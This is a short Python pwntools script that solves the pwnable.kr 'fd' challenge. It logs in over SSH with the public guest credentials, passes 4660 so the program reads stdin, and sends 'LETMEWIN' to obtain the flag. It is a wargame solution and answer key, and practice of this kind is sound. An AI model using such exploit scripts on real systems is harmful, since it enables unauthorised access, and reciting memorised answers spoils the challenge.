from pwn import *

p = ssh('fd', 'pwnable.kr', 2222, 'guest')

path = './fd'
argv = "4660"

payload = [path, argv]
proc = p.process(executable='./fd', argv=['fd', '4660'])
proc.sendline("LETMEWIN")
response = proc.recvall()
print(response.decode())
p.close()